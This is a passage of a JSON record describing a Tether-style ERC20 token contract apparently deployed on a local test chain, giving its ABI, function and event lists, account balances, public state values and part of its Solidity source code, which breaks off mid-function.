"nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "getOwner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "owner",\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "symbol",\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "name": "transfer",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "setParams",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "issue",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "redeem",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "name": "allowance",\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "basisPointsRate",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "name": "isBlackListed",\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "name": "removeBlackList",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": true,\n          "inputs": [],\n          "name": "MAX_UINT",\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "view",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "name": "transferOwnership",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "constant": false,\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "name": "destroyBlackFunds",\n          "outputs": [],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "function"\n        },\n        {\n          "inputs": [\n            {\n              "name": "_initialSupply",\n              "type": "uint256"\n            },\n            {\n              "name": "_name",\n              "type": "string"\n            },\n            {\n              "name": "_symbol",\n              "type": "string"\n            },\n            {\n              "name": "_decimals",\n              "type": "uint256"\n            }\n          ],\n          "payable": false,\n          "stateMutability": "nonpayable",\n          "type": "constructor"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Issue",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "name": "Redeem",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ],\n          "name": "Deprecate",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ],\n          "name": "Params",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ],\n          "name": "DestroyedBlackFunds",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "AddedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ],\n          "name": "RemovedBlackList",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Approval",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ],\n          "name": "Transfer",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Pause",\n          "type": "event"\n        },\n        {\n          "anonymous": false,\n          "inputs": [],\n          "name": "Unpause",\n          "type": "event"\n        }\n      ],\n      "functions": [\n        {\n          "name": "name",\n          "signature": "name()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecate",\n          "signature": "deprecate(address)",\n          "inputs": [\n            {\n              "name": "_upgradedAddress",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "approve",\n          "signature": "approve(address, uint256)",\n          "inputs": [\n            {\n              "name": "_spender",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "deprecated",\n          "signature": "deprecated()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "addBlackList",\n          "signature": "addBlackList(address)",\n          "inputs": [\n            {\n              "name": "_evilUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "totalSupply",\n          "signature": "totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferFrom",\n          "signature": "transferFrom(address, address, uint256)",\n          "inputs": [\n            {\n              "name": "_from",\n              "type": "address"\n            },\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "upgradedAddress",\n          "signature": "upgradedAddress()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balances",\n          "signature": "balances(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "decimals",\n          "signature": "decimals()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "maximumFee",\n          "signature": "maximumFee()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "_totalSupply",\n          "signature": "_totalSupply()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "unpause",\n          "signature": "unpause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getBlackListStatus",\n          "signature": "getBlackListStatus(address)",\n          "inputs": [\n            {\n              "name": "_maker",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowed",\n          "signature": "allowed(address, address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            },\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "paused",\n          "signature": "paused()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "balanceOf",\n          "signature": "balanceOf(address)",\n          "inputs": [\n            {\n              "name": "who",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "pause",\n          "signature": "pause()",\n          "inputs": [],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "getOwner",\n          "signature": "getOwner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "owner",\n          "signature": "owner()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "symbol",\n          "signature": "symbol()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "string"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transfer",\n          "signature": "transfer(address, uint256)",\n          "inputs": [\n            {\n              "name": "_to",\n              "type": "address"\n            },\n            {\n              "name": "_value",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "setParams",\n          "signature": "setParams(uint256, uint256)",\n          "inputs": [\n            {\n              "name": "newBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "name": "newMaxFee",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "issue",\n          "signature": "issue(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "redeem",\n          "signature": "redeem(uint256)",\n          "inputs": [\n            {\n              "name": "amount",\n              "type": "uint256"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "allowance",\n          "signature": "allowance(address, address)",\n          "inputs": [\n            {\n              "name": "_owner",\n              "type": "address"\n            },\n            {\n              "name": "_spender",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "remaining",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "basisPointsRate",\n          "signature": "basisPointsRate()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "isBlackListed",\n          "signature": "isBlackListed(address)",\n          "inputs": [\n            {\n              "name": "",\n              "type": "address"\n            }\n          ],\n          "outputs": [\n            {\n              "name": "",\n              "type": "bool"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "removeBlackList",\n          "signature": "removeBlackList(address)",\n          "inputs": [\n            {\n              "name": "_clearedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "MAX_UINT",\n          "signature": "MAX_UINT()",\n          "inputs": [],\n          "outputs": [\n            {\n              "name": "",\n              "type": "uint256"\n            }\n          ],\n          "stateMutability": "view",\n          "payable": false,\n          "constant": true,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "transferOwnership",\n          "signature": "transferOwnership(address)",\n          "inputs": [\n            {\n              "name": "newOwner",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        },\n        {\n          "name": "destroyBlackFunds",\n          "signature": "destroyBlackFunds(address)",\n          "inputs": [\n            {\n              "name": "_blackListedUser",\n              "type": "address"\n            }\n          ],\n          "outputs": [],\n          "stateMutability": "nonpayable",\n          "payable": false,\n          "constant": false,\n          "visibility": "public",\n          "modifiers": []\n        }\n      ],\n      "events": [\n        {\n          "name": "Issue",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Redeem",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "amount",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Deprecate",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "newAddress",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Params",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "feeBasisPoints",\n              "type": "uint256"\n            },\n            {\n              "indexed": false,\n              "name": "maxFee",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "DestroyedBlackFunds",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_blackListedUser",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "_balance",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "AddedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "RemovedBlackList",\n          "inputs": [\n            {\n              "indexed": false,\n              "name": "_user",\n              "type": "address"\n            }\n          ]\n        },\n        {\n          "name": "Approval",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "owner",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "spender",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Transfer",\n          "inputs": [\n            {\n              "indexed": true,\n              "name": "from",\n              "type": "address"\n            },\n            {\n              "indexed": true,\n              "name": "to",\n              "type": "address"\n            },\n            {\n              "indexed": false,\n              "name": "value",\n              "type": "uint256"\n            }\n          ]\n        },\n        {\n          "name": "Pause",\n          "inputs": []\n        },\n        {\n          "name": "Unpause",\n          "inputs": []\n        }\n      ],\n      "accounts_balances": {\n        "0xe982E462b094850F12AF94d21D470e21bE9D0E9C": 0,\n        "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1": 99748409580000000000,\n        "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0": 100000000000000000000,\n        "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b": 100000000000000000000\n      },\n      "public_state": {\n        "_contract_eth_balance_wei": 0,\n        "_contract_eth_balance_eth": 0,\n        "name": "MyToken",\n        "deprecated": false,\n        "totalSupply": 1000000,\n        "upgradedAddress": "0x0000000000000000000000000000000000000000",\n        "balances": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "decimals": 18,\n        "maximumFee": 0,\n        "_totalSupply": 1000000,\n        "getBlackListStatus": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "paused": false,\n        "balanceOf": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": 1000000\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": 0\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": 0\n          }\n        ],\n        "getOwner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "owner": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n        "symbol": "MTK",\n        "basisPointsRate": 0,\n        "isBlackListed": [\n          {\n            "address": "0x90F8bf6A479f320ead074411a4B0e7944Ea8c9C1",\n            "value": false\n          },\n          {\n            "address": "0xFFcf8FDEE72ac11b5c542428B35EEF5769C409f0",\n            "value": false\n          },\n          {\n            "address": "0x22d491Bde2303f2f43325b2108D26f1eAbA1e32b",\n            "value": false\n          }\n        ],\n        "MAX_UINT": 115792089237316195423570985008687907853269984665640564039457584007913129639935\n      },\n      "source_code_snippet": "pragma solidity ^0.4.17;\\n\\n/**\\n * @title SafeMath\\n * @dev Math operations with safety checks that throw on error\\n */\\nlibrary SafeMath {\\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\\n        if (a == 0) {\\n            return 0;\\n        }\\n        uint256 c = a * b;\\n        assert(c / a == b);\\n        return c;\\n    }\\n\\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\\n        // assert(b > 0); // Solidity automatically throws when dividing by 0\\n        uint256 c = a / b;\\n        // assert(a == b * c + a % b); // There is no case in which this doesn\'t hold\\n        return c;\\n    }\\n\\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\\n        assert(b <= a);\\n        return a - b;\\n    }\\n\\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\\n        uint256 c = a + b;\\n        assert(c >= a);\\n        return c;\\n    }\\n}\\n\\n/**\\n * @title Ownable\\n * @dev The Ownable contract has an owner address, and provides basic authorization control\\n * functions, this simplifies the implementation of \\"user permissions\\".\\n */\\ncontract Ownable {\\n    address public owner;\\n\\n    /**\\n      * @dev The Ownable constructor sets the original `owner` of the contract to the sender\\n      * account.\\n      */\\n    function Ownable() public {\\n        owner = msg.sender;\\n    }\\n\\n    /**\\n      * @dev Throws if called by any account other than the owner.\\n      */\\n    modifier onlyOwner() {\\n        require(msg.sender == owner);\\n        _;\\n    }\\n\\n    /**\\n    * @dev Allows the current owner to transfer control of the contract to a newOwner.\\n    * @param newOwner The address to transfer ownership to.\\n    */\\n    function transferOwnership(address newOwner) public onlyOwner {\\n        if (newOwner != address(0)) {\\n            owner = newOwner;\\n        }\\n    }\\n\\n}\\n\\n/**\\n * @title ERC20Basic\\n * @dev Simpler version of ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20Basic {\\n    uint public _totalSupply;\\n    function totalSupply() public constant returns (uint);\\n    function balanceOf(address who) public constant returns (uint);\\n    function transfer(address to, uint value) public;\\n    event Transfer(address indexed from, address indexed to, uint value);\\n}\\n\\n/**\\n * @title ERC20 interface\\n * @dev see https://github.com/ethereum/EIPs/issues/20\\n */\\ncontract ERC20 is ERC20Basic {\\n    function allowance(address owner, address spender) public constant returns (uint);\\n    function transferFrom(address from, address to, uint value) public;\\n    function approve(address spender, uint value) public;\\n    event Approval(address indexed owner, address indexed spender, uint value);\\n}\\n\\n/**\\n * @title Basic token\\n * @dev Basic version of StandardToken, with no allowances.\\n */\\ncontract BasicToken is Ownable, ERC20Basic {\\n    using SafeMath for uint;\\n\\n    mapping(address => uint) public balances;\\n\\n    // additional variables for use if transaction fees ever became necessary\\n    uint public basisPointsRate = 0;\\n    uint public maximumFee = 0;\\n\\n    /**\\n    * @dev Fix for the ERC20 short address attack.\\n    */\\n    modifier onlyPayloadSize(uint size) {\\n        require(!(msg.data.length < size + 4));\\n        _;\\n    }\\n\\n    /**\\n    * @dev transfer token for a specified address\\n    * @param _to The address to transfer to.\\n    * @param _value The amount to be transferred.\\n    */\\n    function transfer(address _to, uint _value) public onlyPayloadSize(2 * 32) {\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[msg.sender] = balances[msg.sender].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(msg.sender, owner, fee);\\n        }\\n        Transfer(msg.sender, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Gets the balance of the specified address.\\n    * @param _owner The address to query the the balance of.\\n    * @return An uint representing the amount owned by the passed address.\\n    */\\n    function balanceOf(address _owner) public constant returns (uint balance) {\\n        return balances[_owner];\\n    }\\n\\n}\\n\\n/**\\n * @title Standard ERC20 token\\n *\\n * @dev Implementation of the basic standard token.\\n * @dev https://github.com/ethereum/EIPs/issues/20\\n * @dev Based oncode by FirstBlood: https://github.com/Firstbloodio/token/blob/master/smart_contract/FirstBloodToken.sol\\n */\\ncontract StandardToken is BasicToken, ERC20 {\\n\\n    mapping (address => mapping (address => uint)) public allowed;\\n\\n    uint public constant MAX_UINT = 2**256 - 1;\\n\\n    /**\\n    * @dev Transfer tokens from one address to another\\n    * @param _from address The address which you want to send tokens from\\n    * @param _to address The address which you want to transfer to\\n    * @param _value uint the amount of tokens to be transferred\\n    */\\n    function transferFrom(address _from, address _to, uint _value) public onlyPayloadSize(3 * 32) {\\n        var _allowance = allowed[_from][msg.sender];\\n\\n        // Check is not needed because sub(_allowance, _value) will already throw if this condition is not met\\n        // if (_value > _allowance) throw;\\n\\n        uint fee = (_value.mul(basisPointsRate)).div(10000);\\n        if (fee > maximumFee) {\\n            fee = maximumFee;\\n        }\\n        if (_allowance < MAX_UINT) {\\n            allowed[_from][msg.sender] = _allowance.sub(_value);\\n        }\\n        uint sendAmount = _value.sub(fee);\\n        balances[_from] = balances[_from].sub(_value);\\n        balances[_to] = balances[_to].add(sendAmount);\\n        if (fee > 0) {\\n            balances[owner] = balances[owner].add(fee);\\n            Transfer(_from, owner, fee);\\n        }\\n        Transfer(_from, _to, sendAmount);\\n    }\\n\\n    /**\\n    * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\\n    * @param _spender The address which will spend the funds.\\n    * @param _value The amount of tokens to be spent.\\n    */\\n    function approve(address _spender, uint _value) public onlyPayloadSize(2 * 32) {\\n\\n        // To change the approve amount you first have to reduce the addresses`\\n        //  allowance to zero by calling `approve(_spender, 0)` if it is not\\n        //  already 0 to mitigate the race condition described here:\\n        //  https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\n        require(!((_value != 0) && (allowed[msg.sender][_spender] != 0)));\\n\\n        allowed[msg.sender][_spender] = _value;\\n        Approval(msg.sender, _spender, _value);\\n    }\\n\\n    /**\\n    * @dev Function to check the amount of tokens than an owner allowed to a spender.\\n    * @param _owner address The address which owns the funds.\\n    * @param _spender address The address which will spend the funds.\\n    * @return A uint specifying the amount of tokens still available for the spender.\\n    */\\n    function allowance(address _owner, address _spender) public constant returns (uint remaining) {\\n        return allowed[_owner][_spender];\\n    }\\n\\n}\\n\\n\\n/**\\n * @title Pausable\\n * @dev Base contract which allows children to implement an emergency stop mechanism.\\n */\\ncontract Pausable is Ownable {\\n  event Pause();\\n  event Unpause();\\n\\n  bool public paused = false;\\n\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is not paused.\\n   */\\n  modifier whenNotPaused() {\\n    require(!paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev Modifier to make a function callable only when the contract is paused.\\n   */\\n  modifier whenPaused() {\\n    require(paused);\\n    _;\\n  }\\n\\n  /**\\n   * @dev called by the owner to pause, triggers stopped state\\n   */\\n  function pause() onlyOwner whenNotPaused public {\\n    paused = true;\\n    Pause();\\n  }\\n\\n  /**\\n   * @dev called by the owner to unpause, returns to normal state\\n   */\\n  function unpause() onlyOwner whenPaused public {\\n    paused = false;\\n    Unpause();\\n  }\\n}\\n\\ncontract BlackList is Ownable, BasicToken {\\n\\n    /////// Getters to allow the same blacklist to be used also by other contracts (including upgraded Tether) ///////\\n    function getBlackListStatus(address _maker) external constant returns (bool) {\\n        return isBlackListed[_maker];\\n    }\\n\\n    function getOwner() external constant returns (address) {\\n        return owner;\\n    }\\n\\n    mapping (address => bool) public isBlackListed;\\n    \\n    function addBlackList (address _evilUser) public onlyOwner {\\n        isBlackListed[_evilUser] = true;\\n        AddedBlackList(_evilUser);\\n    }\\n\\n    function removeBlackList (address _clearedUser) public onlyOwner {\\n        isBlackListed[_clearedUser] = false;\\n        RemovedBlackList(_clearedUser);\\n    }\\n\\n    function destroyBlackFunds (address _blackListedUser) public onlyOwner {\\n        require(isBlackListed[_blackListedUser]);\\n        uint dirtyFunds = balanceOf(_blackListedUser);\\n        balances[_blackListedUser] = 0;\\n        _totalSupply -= dirtyFunds;\\n        DestroyedBlackFunds(_blackListedUser, dirtyFunds);\\n    }\\n\\n    event DestroyedBlackFunds(address _blackListedUser, uint _balance);\\n\\n    event AddedBlackList(address _user);\\n\\n    event RemovedBlackList(address _user);\\n\\n}\\n\\ncontract UpgradedStandardToken is StandardToken{\\n    // those methods are called by the legacy contract\\n    // and they must ensure msg.sender to be the contract address\\n    function transferByLegacy(address from, address to, uint value) public;\\n    function transferFromByLegacy(address sender, address from, address spender, uint value) public;\\n    function approveByLegacy(address from, address spender, uint value) public;\\n}\\n\\ncontract TetherToken is Pausable, StandardToken, BlackList {\\n\\n    string public name;\\n    string public symbol;\\n    uint public decimals;\\n    address public upgradedAddress;\\n    bool public deprecated;\\n\\n    //  The contract can be initialized with a number of tokens\\n    //  All the tokens are deposited to the owner address\\n    //\\n    // @param _balance Initial supply of the contract\\n    // @param _name Token Name\\n    // @param _symbol Token symbol\\n    // @param _decimals Token decimals\\n    function TetherToken(uint _initialSupply, string _name, string _symbol, uint _decimals) public {\\n        _totalSupply = _initialSupply;\\n        name = _name;\\n        symbol = _symbol;\\n        decimals = _decimals;\\n        balances[owner] = _initialSupply;\\n        deprecated = false;\\n    }\\n\\n    // Forward ERC20 methods to upgraded contract if this one is deprecated\\n    function transfer(address _to, uint _value) public whenNotPaused {\\n        require(!isBlackListed[msg.sender]);\\n        if (deprecated) {\\n            return UpgradedStandardToken(upgradedAddress).transferByLegacy(msg.sender, _to, _value);\\n        } else {\\n            return super.transfer(_to, _value);\\n        }\\n    }\\n\\n    // Forward ERC20 methods to 